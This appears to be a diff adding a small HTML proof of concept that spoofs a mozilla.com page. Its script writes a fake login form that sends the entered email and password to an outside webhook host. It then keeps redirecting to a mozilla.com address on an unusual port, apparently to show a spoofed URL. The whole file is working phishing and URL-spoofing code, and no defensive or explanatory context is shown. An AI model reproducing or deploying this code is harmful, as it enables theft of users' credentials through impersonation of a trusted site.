@@ -1,0 +1,9 @@
+<script>
+    var spoof = function () {
+        document.write("<h1>mozilla.com</h1><form action='https://jolly-wolf-54.webhook.cool' method='GET'><input type='email' name='email' placeholder='Email' /><input type='password' name='pass' placeholder='Password' /><input type='submit' value='Login' /></form>");
+        document.location = "https://mozilla.com:3117";
+        setInterval(function () { document.location = "https://mozilla.com:3117"; }, 9800);
+    };
+</script>
+
+<input type="button" value="Spoof" onclick="spoof();" />
